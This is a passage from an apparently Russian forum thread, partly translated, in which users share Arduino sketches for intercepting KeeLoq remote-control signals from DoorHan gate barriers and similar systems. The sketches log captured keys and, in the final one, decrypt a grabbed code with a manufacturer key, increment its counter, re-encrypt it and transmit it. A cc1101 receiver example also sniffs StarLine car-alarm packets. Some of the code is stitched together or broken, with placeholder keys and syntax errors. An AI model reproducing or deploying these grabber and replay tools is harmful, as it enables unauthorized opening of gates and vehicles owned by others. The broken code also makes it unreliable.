@@ -1,0 +1,1217 @@
+﻿#11
+	
+
+	 По умолчанию 
+ 
+________________
+
+
+
+
+#define RX 2
+#define swPin 5
+
+Keeloq k(0xhigh,0xlow); <-- MAN
+
+
+volatile byte level=255;
+volatile unsigned long last, len;
+byte p_level, fbutt, decbutt;
+unsigned long p_len, p_len_prev, hdec, hop;
+boolean dec_valid = false;
+
+
+struct
+{
+byte state;
+unsigned long TE;
+byte pre_count, data[8], dat_bit;
+} keeloq;
+
+void setbit(byte *data, byte n)
+{
+data[n/8]|=1<<(n%8);
+}
+
+byte florsstate = 0;
+byte i = 0; // count of bits stored
+byte nicereceive[52];
+
+
+#define KL_MIN_PRE_COUNT 4
+#define KL_MAX_TE 500
+#define KL_MIN_TE 300
+#define KL_MAX_BITS 64
+
+void process_keeloq()
+{
+switch(keeloq.state)
+{
+case 0:
+if(p_level) break;
+keeloq.state=1;
+keeloq.pre_count=0;
+break;
+
+case 1: //pre+hdr
+if(p_len>=KL_MIN_TE && p_len<=KL_MAX_TE) keeloq.pre_count++;
+else if(!p_level && p_len>=KL_MIN_TE*10 && p_len<=KL_MAX_TE*10 && keeloq.pre_count>=KL_MIN_PRE_COUNT)
+{
+keeloq.TE=p_len/10;
+keeloq.state=2;
+keeloq.dat_bit=0;
+keeloq.data[0]=0x00;
+keeloq.data[1]=0x00;
+keeloq.data[2]=0x00;
+keeloq.data[3]=0x00;
+keeloq.data[4]=0x00;
+keeloq.data[5]=0x00;
+keeloq.data[6]=0x00;
+keeloq.data[7]=0x00;
+dec_valid = false;
+}
+else
+{
+keeloq.state=0;
+break;
+}
+break;
+
+case 2: //dat
+if(!p_level) break;
+
+if(p_len<keeloq.TE/2 || p_len>keeloq.TE*3)
+{
+keeloq.state=0;
+break;
+}
+
+if(p_len<=keeloq.TE+keeloq.TE/2) setbit(keeloq.data, keeloq.dat_bit);
+if(++keeloq.dat_bit==KL_MAX_BITS) keeloq.state=100;
+break;
+}
+}
+
+
+
+void dump_hex(byte *buf, byte bits)
+{
+byte a;
+if (dec_valid) Serial.print("KEELOQ_DECRYPT: "); else Serial.print("KEELOQ: ");
+for(a=0; a<(bits+7)/8; a++)
+{
+if(buf[a]<=0x0f) Serial.print('0');
+Serial.print(buf[a], HEX);
+Serial.print(" ");
+}
+Serial.println("");
+}
+
+void rx_int()
+{
+if(level!=255) return;
+
+len=micros()-last;
+last=micros();
+
+if(digitalRead(RX)==HIGH) level=0;
+else level=1;
+}
+
+void setup()
+{
+pinMode(swPin, OUTPUT);
+digitalWrite(swPin, HIGH);
+attachInterrupt(0, rx_int, CHANGE);
+
+Serial.begin(115200);
+while(!Serial);
+
+Serial.println("LOGGER START");
+Serial.println("");
+
+interrupts();
+}
+
+byte a;
+
+void loop()
+{
+if(level!=255)
+{
+noInterrupts();
+p_level=level;
+p_len=len;
+len=0;
+level=255;
+interrupts();
+
+process_keeloq();
+
+
+p_len_prev=p_len;
+}
+
+if(keeloq.state==100)
+{
+hop =keeloq.data[3]; hop<<=8;
+hop+=keeloq.data[2]; hop<<=8;
+hop+=keeloq.data[1]; hop<<=8;
+hop+=keeloq.data[0];
+hdec = k.decrypt(hop);
+keeloq.data[3]=hdec; hdec>>=8;
+keeloq.data[2]=hdec; hdec>>=8;
+keeloq.data[1]=hdec; hdec>>=8;
+keeloq.data[0]=hdec;
+decbutt=keeloq.data[0];
+decbutt>>=4;
+fbutt=keeloq.data[7];
+fbutt>>=4;
+if((fbutt == decbutt) && (keeloq.data[1] == keeloq.data[4])) dec_valid = true;
+
+dump_hex(keeloq.data, 64);
+keeloq.state=0;
+}
+}
+
+Добавлено через 2 минуты
+а это отправка пакета
+
+
+#define TX 8
+
+#include <Keeloq.h>
+Keeloq k(0xhigh,low); <-- MAN
+
+byte CODE[8];
+byte TCODE[8];
+
+byte Buffer_Fix[4] = {0x0E, 0x00, 0x07, 0x20};
+byte S1, S2 ;
+unsigned long henc, hop ;
+
+void setup()
+{
+Serial.begin(115200);
+Serial.println("KEELOQ SEND:");
+pinMode(TX, OUTPUT);
+
+CODE[0]=0;
+CODE[1]=0;
+CODE[2]=0;
+CODE[3]=0;
+CODE[4]=0;
+CODE[5]=0;
+CODE[6]=0;
+CODE[7]=0;
+
+hop=0;
+henc=0;
+
+S1 = 0x0;
+S2 = 0x0;
+
+
+}
+
+void loop()
+{
+
+hop = Buffer_Fix[3] ; hop<<=8;
+hop+= Buffer_Fix[0] ; hop<<=8;
+hop+= S1 ; hop<<=8;
+hop+= S2 ;
+
+if (S2 == 255) {S2 = 0;S1++;}
+else S2++;
+
+Serial.print (hop ,HEX);
+Serial.println("");
+
+henc = k.encrypt(hop);
+
+Serial.print (henc ,HEX);
+Serial.println("");
+
+CODE[0]=henc; henc>>=8;
+CODE[1]=henc; henc>>=8;
+CODE[2]=henc; henc>>=8;
+CODE[3]=henc;
+CODE[4] = Buffer_Fix[0];
+CODE[5] = Buffer_Fix[1];
+CODE[6] = Buffer_Fix[2];
+CODE[7] = Buffer_Fix[3];
+
+for (int i=0; i<6; i++) {
+
+SendKeeloq(CODE);
+}
+Serial.print(">>> ");
+dump_hex(CODE, 64);
+Serial.println("");
+
+CODE[0]=0;
+CODE[1]=0;
+CODE[2]=0;
+CODE[3]=0;
+CODE[4]=0;
+CODE[5]=0;
+CODE[6]=0;
+CODE[7]=0;
+
+hop=0;
+henc=0;
+
+delay(5000);
+}
+
+void SendMeander(unsigned int meanderLen)
+{
+digitalWrite(TX, HIGH);
+delayMicroseconds(meanderLen);
+digitalWrite(TX, LOW);
+delayMicroseconds(meanderLen);
+}
+// Keeloq ----------------------------------------------
+void SendKeeloqPreambula()
+{
+for (byte i=0; i<11; i++)
+SendMeander(400);
+}
+
+void SendKeeloq(unsigned char *TCODE)
+{
+signed char a;
+SendKeeloqPreambula();
+digitalWrite(TX, HIGH);
+delayMicroseconds(400);
+digitalWrite(TX, LOW);
+delayMicroseconds(10*400);
+
+for(a=0; a<66; a++)
+{
+digitalWrite(TX, HIGH);
+delayMicroseconds(400);
+if(TCODE[a/8]&(1<<(a%8))) digitalWrite(TX, LOW);
+delayMicroseconds(400);
+digitalWrite(TX, LOW);
+delayMicroseconds(400);
+}
+delay(16);
+}
+
+void dump_hex(byte *buf, byte bits)
+{
+byte a;
+
+for(a=0; a<(bits+7)/8; a++)
+{
+if(buf[a]<=0x0f) Serial.print('0');
+Serial.print(buf[a], HEX);
+}
+Serial.println("");
+}
+//---------------------------------------------------------
+	 heat вне форума 
+  
+	 Ответить с цитированием 
+
+	
+
+	  #12
+	
+
+	 По умолчанию 
+ 
+________________
+
+
+ A close-up of several small electronic components
+
+Description automatically generated 
+
+
+В программу приемника добавлен мной код, чтобы при принятии сигнала была вибрация. Также есть запоминание в EEPROM память принимаемого слова. Также есть вывод на дисплей принимаемого слова.
+
+#define RX 2 //подключен радиоприемник
+#include <PCD8544.h> //библиотека для LCD дисплея
+#include <avr/eeprom.h>
+#include <Keeloq.h>
+static PCD8544 lcd;
+static unsigned long counter=1, t=1, s=1;
+int j=0, z=0;
+volatile static long code1 = 0;
+byte t0,t1,t2,t3,t4,t5,t6,t7;
+const int motor_pin = 8; //вибромоторчик
+long interval = 500; // интервал между включение/выключение вибромотора (0,5 секунд)
+long previousMillis = 0;
+Keeloq k('0xhigh','0xlow'); //<-- MAN
+
+volatile byte level=255;
+volatile unsigned long last, len;
+byte p_level, fbutt, decbutt;
+unsigned long p_len, p_len_prev, hdec, hop;
+boolean dec_valid = false;
+
+struct
+{
+byte state;
+unsigned long TE;
+byte pre_count, data[8], dat_bit;
+} keeloq;
+
+void setbit(byte *data, byte n)
+{
+data[n/8]|=1<<(n%8);
+}
+
+byte florsstate = 0;
+byte i = 0; // count of bits stored
+byte nicereceive[52];
+
+#define KL_MIN_PRE_COUNT 4
+#define KL_MAX_TE 500
+#define KL_MIN_TE 300
+#define KL_MAX_BITS 64
+
+void process_keeloq()
+{
+switch(keeloq.state)
+{
+case 0:
+if(p_level) break;
+keeloq.state=1;
+keeloq.pre_count=0;
+break;
+
+case 1: //pre+hdr
+if(p_len>=KL_MIN_TE && p_len<=KL_MAX_TE) keeloq.pre_count++;
+else if(!p_level && p_len>=KL_MIN_TE*10 && p_len<=KL_MAX_TE*10 && keeloq.pre_count>=KL_MIN_PRE_COUNT)
+{
+keeloq.TE=p_len/10;
+keeloq.state=2;
+keeloq.dat_bit=0;
+keeloq.data[0]=0x00;
+keeloq.data[1]=0x00;
+keeloq.data[2]=0x00;
+keeloq.data[3]=0x00;
+keeloq.data[4]=0x00;
+keeloq.data[5]=0x00;
+keeloq.data[6]=0x00;
+keeloq.data[7]=0x00;
+dec_valid = false;
+}
+else
+{
+keeloq.state=0;
+break;
+}
+break;
+
+case 2: //dat
+if(!p_level) break;
+
+if(p_len<keeloq.TE/2 || p_len>keeloq.TE*3)
+{
+keeloq.state=0;
+break;
+}
+
+if(p_len<=keeloq.TE+keeloq.TE/2) setbit(keeloq.data, keeloq.dat_bit);
+if(++keeloq.dat_bit==KL_MAX_BITS) keeloq.state=100;
+break;
+}
+}
+
+void dump_hex(byte *buf, byte bits)
+{
+byte a;
+if (dec_valid) Serial.print("KEELOQ_DECRYPT: "); else Serial.print("KEELOQ: ");
+
+for(a=0; a<(bits+7)/8; a++)
+{
+if(buf[a]<=0x0f) Serial.print('0');
+Serial.print(buf[a], HEX);
+Serial.print(" ");
+}
+Serial.println("");
+}
+
+void rx_int()
+{
+if(level!=255) return;
+
+len=micros()-last;
+last=micros();
+
+if(digitalRead(RX)==HIGH) level=0;
+else level=1;
+}
+
+void setup()
+{
+attachInterrupt(0, rx_int, CHANGE);
+pinMode(motor_pin, OUTPUT);
+Serial.begin(9600);
+while(!Serial);
+
+Serial.println("Кто молодец? Я молодец!");
+Serial.println("");
+
+interrupts();
+lcd.begin(84,48);
+lcd.setCursor(0,0);
+lcd.print(" Reciever ");
+lcd.print(" is ready! ");
+//Вывод в монитор порта содержимого EEPROM-памяти
+while (j<=1016)
+{
+Serial.print(t);
+Serial.print(") ");
+Serial.print(eeprom_read_byte(j+3), HEX);
+Serial.print(eeprom_read_byte(j+2), HEX);
+Serial.print(eeprom_read_byte(j+1), HEX);
+Serial.print(eeprom_read_byte(j), HEX);
+Serial.print(" ");
+Serial.print(eeprom_read_byte(j+7), HEX);
+Serial.print(eeprom_read_byte(j+6), HEX);
+Serial.print(eeprom_read_byte(j+5), HEX);
+Serial.println(eeprom_read_byte(j+4), HEX);
+j=j+8;
+t++;
+}
+}
+
+byte a;
+
+void loop()
+{
+unsigned long currentMillis = millis();
+if (s==2)
+{
+digitalWrite(motor_pin, HIGH);
+s=1;
+previousMillis=millis();
+}
+if(currentMillis - previousMillis > interval)
+{
+digitalWrite(motor_pin, LOW);
+}
+if(level!=255)
+{
+noInterrupts();
+p_level=level;
+p_len=len;
+len=0;
+level=255;
+interrupts();
+
+process_keeloq();
+
+p_len_prev=p_len;
+}
+
+if(keeloq.state==100)
+{
+hop =keeloq.data[3]; hop<<=8;
+hop+=keeloq.data[2]; hop<<=8;
+hop+=keeloq.data[1]; hop<<=8;
+hop+=keeloq.data[0];
+hdec = k.decrypt(hop);
+keeloq.data[3]=hdec; hdec>>=8;
+keeloq.data[2]=hdec; hdec>>=8;
+keeloq.data[1]=hdec; hdec>>=8;
+keeloq.data[0]=hdec;
+decbutt=keeloq.data[0];
+decbutt>>=4;
+fbutt=keeloq.data[7];
+fbutt>>=4;
+if((fbutt == decbutt) && (keeloq.data[1] == keeloq.data[4])) dec_valid = true;
+
+dump_hex(keeloq.data, 64);
+keeloq.state=0;
+//Вывод на дисплей
+lcd.setCursor(0, 2);
+lcd.print(counter);
+
+t0=keeloq.data[0];
+t1=keeloq.data[1];
+t2=keeloq.data[2];
+t3=keeloq.data[3];
+t4=keeloq.data[4];
+t5=keeloq.data[5];
+t6=keeloq.data[6];
+t7=keeloq.data[7];
+lcd.setCursor(0, 3);
+lcd.print(t0, HEX);
+lcd.setCursor(14, 3);
+lcd.print(t1, HEX);
+lcd.setCursor(28, 3);
+lcd.print(t2, HEX);
+lcd.setCursor(42, 3);
+lcd.print(t3, HEX);
+lcd.setCursor(0, 4);
+lcd.print(t4, HEX);
+lcd.setCursor(14, 4);
+lcd.print(t5, HEX);
+lcd.setCursor(28, 4);
+lcd.print(t6, HEX);
+lcd.setCursor(42, 4);
+lcd.print(t7, HEX);
+
+//запись перехваченного ключа в EEPROM
+eeprom_write_byte(z, t3);
+eeprom_write_byte(z+1, t2);
+eeprom_write_byte(z+2, t1);
+eeprom_write_byte(z+3, t0);
+eeprom_write_byte(z+4, t7);
+eeprom_write_byte(z+5, t6);
+eeprom_write_byte(z+6, t5);
+eeprom_write_byte(z+7, t4);
+z=z+8;
+counter++;
+s=2;
+}
+}
+
+Добавлено через 4 минуты
+Вот так все выглядит. Код на дисплее на фото левый (не обращайте внимания на это).
+ A circuit board with wires on it
+
+Description automatically generated 
+	 tetrod вне форума 
+  
+	 Ответить с цитированием 
+
+	
+
+ Старый 
+ 25.02.2020, 23:01
+	  #13
+	heat
+Член клуба
+ 
+Регистрация: 12.10.2017
+Сообщений: 173
+	 По умолчанию 
+ 
+________________
+
+
+The majority of these cheap receivers are of terrible quality.
+The best reception is on cc1101. With the right settings, 300 meters in the city is no problem.
+Get a proper OLED display that connects via i2c - small black and white clones of Adafruit are sold on Ali. The ones in the photo I simply threw away.
+Bulky constructions are not really great in operational mode.
+Added in 2 minutes Don't constantly write packets to EEPROM, the processor will die. There aren't that many cycles.
+
+
+	 heat вне форума 
+  
+	 Ответить с цитированием 
+
+	 Старый 
+ 26.02.2020, 00:22
+	  #14
+	heat, please tell me. Do I understand correctly that I can simply throw out the AliExpress radio receiver and plug in a cc1101 receiver? Do I not need to change anything in the electrical circuit or in the software?
+26.02.2020, 08:52 #15
+heat Club Member
+Registration: 12.10.2017 Posts: 173 Re: Doorhan Barrier. Intercept the code!
+________________
+
+
+Quote: Message from tetrod
+heat, please tell me. Do I understand correctly that I can simply throw out the AliExpress radio receiver and plug in a cc1101 receiver? Do I not need to change anything in the electrical circuit or in the software?
+Incorrect. cc1101 is a serious tool, it needs a config and it is connected via SPI bus. Download smart RF studio, learn how to inject the config and look at examples. cc1101 has control commands. Initialization, reset, reception, transmission, config update. Read about all this. cc1101 cannot be installed just like that.
+Well, for example, reception on cc1101
+
+
+#include <SPI.h>
+
+
+#define CC_CS  10
+#define CC_RX  2 //GDO2
+#define CC_TX  3 //GDO0
+
+
+#define SRES  0x30
+#define SCAL  0x33
+#define SRX   0x34
+#define STX   0x35
+#define SIDLE 0x36
+#define SPWD  0x39
+
+
+#define IOCFG2     0x00
+#define IOCFG1     0x01
+#define IOCFG0     0x02
+#define FIFOTHR    0x03
+#define SYNC1      0x04
+#define SYNC0      0x05
+#define PKTLEN     0x06
+#define PKTCTRL1   0x07
+#define PKTCTRL0   0x08
+#define ADDR       0x09
+#define CHANNR     0x0A
+#define FSCTRL1    0x0B
+#define FSCTRL0    0x0C
+#define FREQ2      0x0D
+#define FREQ1      0x0E
+#define FREQ0      0x0F
+#define MDMCFG4    0x10
+#define MDMCFG3    0x11
+#define MDMCFG2    0x12
+#define MDMCFG1    0x13
+#define MDMCFG0    0x14
+#define DEVIATN    0x15
+#define MCSM2      0x16
+#define MCSM1      0x17
+#define MCSM0      0x18
+#define FOCCFG     0x19
+#define BSCFG      0x1A
+#define AGCTRL2    0x1B
+#define AGCTRL1    0x1C
+#define AGCTRL0    0x1D
+#define WOREVT1    0x1E
+#define WOREVT0    0x1F
+#define WORCTRL    0x20
+#define FREND1     0x21
+#define FREND0     0x22
+#define FSCAL3     0x23
+#define FSCAL2     0x24
+#define FSCAL1     0x25
+#define FSCAL0     0x26
+#define RCCTRL1    0x27
+#define RCCTRL0    0x28
+#define FSTEST     0x29
+#define PTEST      0x2A
+#define AGCTEST    0x2B
+#define TEST2      0x2C
+#define TEST1      0x2D
+#define TEST0      0x2E
+#define PATABLE    0x3E
+
+
+const byte cc_config[] PROGMEM=
+{
+  IOCFG0,  0b00000000,
+  IOCFG2,  0b00001101,
+  FIFOTHR, 0b01000111,
+  PKTCTRL0,0b00110010,
+  FSCTRL1, 0x06,
+  FSCTRL0, 0x00,
+  FREQ2,   0x10,
+  FREQ1,   0xB0,
+  FREQ0,   0x71,
+  MDMCFG4, 0x16,
+  MDMCFG3, 0xe4,
+  MDMCFG2, 0b00110000,
+  MDMCFG1, 0x22,
+  MDMCFG0, 0xF8,
+  MCSM2,   0x07,
+  MCSM1,   0x30,
+  MCSM0,   0x18,
+  AGCTRL2, 0b00000100,
+  AGCTRL1, 0x00,
+  AGCTRL0, 0b00010000,
+  FREND1,  0xB6,
+  FREND0,  0b00010001,
+  FSCAL3,  0xE9,
+  FSCAL2,  0x2A,
+  FSCAL1,  0x00,
+  FSCAL0,  0x1F,
+  TEST2,   0x81,
+  TEST1,   0x35,
+  TEST0,   0x09,
+  PATABLE, 0x00,
+  PATABLE, 0xc0,
+  PATABLE, 0x00,
+  PATABLE, 0x00,
+  PATABLE, 0x00,
+  PATABLE, 0x00,
+  PATABLE, 0x00,
+  PATABLE, 0x00
+};
+
+
+volatile byte level=255;
+volatile unsigned long last, len;
+byte p_level;
+unsigned long p_len, p_len_prev;
+
+
+struct
+{
+  byte state;
+  unsigned long TE;
+  byte pre_count, data[8], dat_bit;
+} keeloq;
+
+
+struct
+{
+  byte state;
+  byte pre_count, data[8], dat_bit;
+} starline;
+
+
+void cc1101_strobe(byte s)
+{
+  digitalWrite(CC_CS, LOW);
+  delay(1);
+  SPI.transfer(s);
+  digitalWrite(CC_CS, HIGH);
+}
+
+
+void cc1101_init()
+{
+  byte a;
+
+
+  cc1101_strobe(SRES);
+  delay(10);
+
+
+  digitalWrite(CC_CS, LOW);
+  for(a=0; a<sizeof(cc_config); a++)
+    SPI.transfer(pgm_read_byte(cc_config+a));
+  digitalWrite(CC_CS, HIGH);
+}
+
+
+void rtx_rx()
+{
+  cc1101_strobe(SIDLE);
+  cc1101_strobe(SRX);
+}
+
+
+void rtx_tx()
+{
+  cc1101_strobe(SIDLE);
+  cc1101_strobe(STX);
+}
+
+
+void setbit(byte *data, byte n)
+{
+  data[n/8]|=1<<(n%8);
+}
+
+
+#define KL_MIN_PRE_COUNT 4
+#define KL_MAX_TE 500
+#define KL_MIN_TE 300
+#define KL_MAX_BITS 64
+
+
+void process_keeloq()
+{
+  switch(keeloq.state)
+  {
+    case 0:
+      if(p_level) break;
+      keeloq.state=1;
+      keeloq.pre_count=0;
+      break;
+
+
+    case 1: //pre+hdr
+      if(p_len>=KL_MIN_TE && p_len<=KL_MAX_TE) keeloq.pre_count++;
+      else if(!p_level && p_len>=KL_MIN_TE*10 && p_len<=KL_MAX_TE*10 && keeloq.pre_count>=KL_MIN_PRE_COUNT)
+      {
+        keeloq.TE=p_len/10;
+        keeloq.state=2;
+        keeloq.dat_bit=0;
+        keeloq.data[0]=0x00;
+        keeloq.data[1]=0x00;
+        keeloq.data[2]=0x00;
+        keeloq.data[3]=0x00;
+        keeloq.data[4]=0x00;
+        keeloq.data[5]=0x00;
+        keeloq.data[6]=0x00;
+        keeloq.data[7]=0x00;
+      }
+        else
+      {
+        keeloq.state=0;
+        break;
+      }
+      break;
+
+
+    case 2: //dat
+      if(!p_level) break;
+
+
+      if(p_len<keeloq.TE/2 || p_len>keeloq.TE*3)
+      {
+        keeloq.state=0;
+        break;
+      }
+
+
+      if(p_len<=keeloq.TE+keeloq.TE/2) setbit(keeloq.data, keeloq.dat_bit);
+      if(++keeloq.dat_bit==KL_MAX_BITS) keeloq.state=100;
+      break;
+  }
+}
+
+
+#define SL_MIN_PRE_COUNT 4
+#define SL_MAX_PRE 1200
+#define SL_MIN_PRE 800
+#define SL_MAX_ZERO 350
+#define SL_MIN_ZERO 100
+#define SL_MAX_ONE 700
+#define SL_MIN_ONE 400
+#define SL_MIN_BITS 16
+#define SL_MAX_BITS 64
+
+
+void process_starline()
+{
+  byte b;
+
+
+  switch(starline.state)
+  {
+    case 0:
+      if(p_level) break;
+      starline.state=1;
+      starline.pre_count=0;
+      break;
+
+
+    case 1: //pre
+      if(p_len>=SL_MIN_PRE && p_len<=SL_MAX_PRE) starline.pre_count++;
+      else if(p_len<SL_MIN_PRE && starline.pre_count>=SL_MIN_PRE_COUNT)
+      {
+        starline.state=2;
+        starline.dat_bit=0;
+        starline.data[0]=0x00;
+        starline.data[1]=0x00;
+        starline.data[2]=0x00;
+        starline.data[3]=0x00;
+        starline.data[4]=0x00;
+        starline.data[5]=0x00;
+        starline.data[6]=0x00;
+        starline.data[7]=0x00;
+      }
+        else
+      {
+        starline.state=0;
+        break;
+      }
+      break;
+
+
+    case 2: //dat
+      if(p_level) break;
+      
+      if(p_len_prev>=SL_MIN_ONE && p_len_prev<=SL_MAX_ONE/* &&
+         p_len>=SL_MIN_ONE && p_len<=SL_MAX_ONE*/) b=1;
+       else
+      if(p_len_prev>=SL_MIN_ZERO && p_len_prev<=SL_MAX_ZERO/* &&
+         p_len>=SL_MIN_ZERO && p_len<=SL_MAX_ZERO*/) b=0;
+      else
+      {
+        if(starline.dat_bit>=SL_MIN_BITS) starline.state=100;
+          else starline.state=0;
+        break;
+      }
+
+
+      if(b) setbit(starline.data, starline.dat_bit);
+      if(++starline.dat_bit==SL_MAX_BITS) starline.state=100;
+      break;
+  }
+}
+
+
+void dump_hex(byte *buf, byte bits)
+{
+  byte a;
+  
+  for(a=0; a<(bits+7)/8; a++)
+  {
+    if(buf[a]<=0x0f) Serial.print('0');
+    Serial.print(buf[a], HEX);
+    Serial.print(" ");
+  }
+  Serial.println("");
+}
+
+
+void rx_int()
+{
+  if(level!=255) return;
+  
+  len=micros()-last;
+  last=micros();
+  
+  if(digitalRead(CC_RX)==HIGH) level=0;
+    else level=1; 
+}
+
+
+void setup()
+{
+  pinMode(CC_RX, INPUT);
+  pinMode(CC_CS, OUTPUT);
+  digitalWrite(CC_CS, HIGH);
+  attachInterrupt(0, rx_int, CHANGE);
+  
+  Serial.begin(115200); 
+  while(!Serial);
+
+
+  Serial.println("MEGA OVERFUCK ARDUINO LOGGER BY HUY FOR NARKOMANS");
+  Serial.println("");
+  
+  SPI.begin();
+  cc1101_init();
+  rtx_rx();  
+  interrupts();
+} 
+
+
+void loop()
+{ 
+  if(level!=255)
+  {
+    p_level=level;
+    p_len=len;
+    len=0;
+    level=255;
+    
+    process_keeloq();
+    process_starline();
+    
+    p_len_prev=p_len;
+  }
+  
+  if(keeloq.state==100)
+  {
+    Serial.print("KEELOQ: ");
+    dump_hex(keeloq.data, 64);
+    keeloq.state=0;
+  }
+  
+  if(starline.state==100)
+  {
+    Serial.print("STARLINE[");
+    Serial.print(starline.dat_bit);
+    Serial.print("]: ");
+    dump_hex(starline.data, starline.dat_bit);
+    starline.state=0;
+  }
+
+#define rxPin 2 // the receiver is connected here
+#define txPin A2 // and the transmitter here
+#define Pe 413 //DoorHan
+#define Pe2 Pe*2 //DoorHan
+#define MAX_DELTA 200 //Maximum deviation in duration during reception
+
+
+volatile static uint64_t manufacturer = 0x0123456789012345; // you need to set the DoorHan manufacturer code here
+
+
+volatile byte level=255;
+volatile unsigned long last, len;
+volatile unsigned int r=0;
+volatile unsigned int lolen, hilen;
+//volatile unsigned int ii=0;
+volatile static byte bcounter = 0; // number of bits received
+volatile static long code1 = 0; // encrypted part
+volatile static long code2 = 0; // fixed part
+volatile static long Cache1 = 0; // encrypted part
+volatile static long Cache2 = 0; // fixed part
+volatile static long Cache1R = 0; // encrypted part
+volatile static long Cache2R = 0; // fixed part
+volatile static long Cache11 = 0; // encrypted part
+volatile static long Cache22 = 0; // fixed part
+volatile static long Cache23 = 0; // fixed part
+volatile static long Cache1O = 0; // encrypted part
+volatile static long Cache2O = 0; // fixed part
+
+
+
+
+/////////////// A piece from the Wiki on encoding and decoding Keeloq functions
+# define KeeLoq_NLF 0x3A5C742E
+# define bitn(x,n) (((x)>>(n))&1)
+# define g5(x,a,b,c,d,e) (bitn(x,a)+bitn(x,b)*2+bitn(x,c)*4+bitn(x,d)*8+bit n(x,e)*16)
+
+
+uint32_t KeeLoq_Encrypt (const uint32_t data, const uint64_t key){
+uint32_t x = data, r;
+for (r = 0; r < 528; r++)
+x = (x>>1)^((bitn(x,0)^bitn(x,16)^(u32)bitn(key,r&63)^ bitn(KeeLoq_NLF,g5(x,1,9,20,26,31)))<<31);
+return x;
+}
+
+
+uint32_t KeeLoq_Decrypt (const uint32_t data, const uint64_t key){
+uint32_t x = data, r;
+for (r = 0; r < 528; r++)
+x = (x<<1)^bitn(x,31)^bitn(x,15)^(u32)bitn(key,(15-r)&63)^bitn(KeeLoq_NLF,g5(x,0,8,19,25,30));
+return x;
+}
+
+
+boolean CheckValue(unsigned int base, unsigned int value) {
+return ((value == base) || ((value > base) && ((value - base) < MAX_DELTA)) || ((value < base) && ((base - value) < MAX_DELTA)));
+}
+///////////////////////////////////////////////////////////////////////////
+
+
+
+
+// This function is called by an interrupt on the pin where the receiver is located
+void rx_int()
+{
+noInterrupts();
+len=micros()-last;
+last=micros();
+interrupts();
+if(digitalRead(rxPin)==HIGH)
+{
+level=1;
+lolen=len;
+}
+else
+{
+level=0;
+hilen=len;
+}
+
+
+/////////////////// Receiving Doorhan and similar
+if (level == 1) {
+if (CheckValue(Pe, hilen) && CheckValue(Pe2, lolen)) {
+if (bcounter < 32)
+code1 = (code1 << 1) | 1;
+else if (bcounter < 64)
+code2 = (code2 << 1) | 1;
+bcounter++;
+}
+else if (CheckValue(Pe2, hilen) && CheckValue(Pe, lolen)) { // valid 0
+if (bcounter < 32)
+code1 = (code1 << 1) | 0;
+else if (bcounter < 64)
+code2 = (code2 << 1) | 0; bcounter++;
+}
+else
+bcounter = 0;
+// Caught 64 bits, which means we write them into variables for further work with them (half the work is done!)
+if (bcounter >= 65) {
+Cache1 = code1;// first piece of code (encrypted)
+Cache2 = code2;// second piece of code (open)
+bcounter = 0;
+
+
+r=1;// This means that we caught the key and can work with it
+code1 = 0;
+code2 = 0;
+}
+}
+}
+
+
+////////////////// Function for mirroring the code, for further decoding.
+long inver(long Cache345)
+{
+long Cache2RR;
+for (int i = 0; i < 32; i++)
+{
+bitWrite(Cache2RR,i,bitRead(Cache345,31-i));
+}
+return Cache2RR;
+}
+//////////////////////////////////////////////////////
+
+
+// Function that sends packets like DoorHan and similar
+void SendANMotors(long c1, long c2)
+{
+noInterrupts(); // temporarily disable packet capture to avoid capturing our own transmissions
+for (int j = 0; j < 4; j++)
+{
+// sending 12 initial 0-1 pulses
+for (int i = 0; i < 12; i++) {
+delayMicroseconds(Pe);
+digitalWrite(txPin, HIGH);
+delayMicroseconds(Pe);
+digitalWrite(txPin, LOW);
+}
+delayMicroseconds(Pe * 10);
+// sending the first half
+for (int i = 4 * 8; i > 0; i--) {
+SendBit(bitRead(c1, i - 1));
+}
+// the second half
+for (int i = 4 * 8; i > 0; i--) {
+SendBit(bitRead(c2, i - 1));
+}
+// and a couple of unnecessary bits, which mean the battery and repeat flag
+SendBit(1);
+SendBit(1);
+delayMicroseconds(Pe * 39);
+}
+interrupts();
+}
+// bit by bit transmission
+void SendBit(byte b) {
+if (b == 0) {
+digitalWrite(txPin, HIGH); // 0
+delayMicroseconds(Pe2);
+digitalWrite(txPin, LOW);
+delayMicroseconds(Pe);
+}
+else {
+digitalWrite(txPin, HIGH); // 1
+delayMicroseconds(Pe);
+digitalWrite(txPin, LOW);
+delayMicroseconds(Pe2);
+}
+}
+
+
+
+
+void setup() {
+Serial.begin(9600);
+pinMode(rxPin, INPUT);
+pinMode(txPin, OUTPUT);
+pinMode(6, OUTPUT);//(power supply for receiver +)
+digitalWrite(6, HIGH);
+attachInterrupt(0, rx_int, CHANGE); //Interrupt 0 is pin D2 on atmega328
+
+void loop()
+{
+if (r==1) //If we caught something, display it in the terminal.
+{
+Serial.print(Cache1, HEX); //display the key as caught part 1
+Serial.print(":");
+Serial.print(Cache2, HEX); //display the key as caught part 2
+Serial.print(" ");
+Serial.print(KeeLoq_Decrypt(inver(Cache1),manufacturer), HEX); //Decrypted part of the key 1
+Serial.print(":");
+Serial.println(inver(Cache2), HEX); //open (unencrypted) part of the key part 2
+
+
+//And this is to check that everything works beautifully, we'll add a counter and encrypt it again
+Serial.print(inver(KeeLoq_Encrypt(KeeLoq_Decrypt(inver(Cache1),manufacturer)+1,manufacturer)),HEX);
+Serial.print(":");
+Serial.println(Cache2, HEX); //display the key as caught part 2
+
+
+SendANMotors(inver(KeeLoq_Encrypt(KeeLoq_Decrypt(inver(Cache1),manufacturer)+1,manufacturer)), Cache2); //Send into the air what we caught, decrypted, added a counter, encrypted.
+
+
+//SendANMotors(0xffffffff, 0xffffffff); //you can send it like this if the key is static
+/////////////////////////////////////////////////////////////////////////////////////
+r=0;
+}
+}
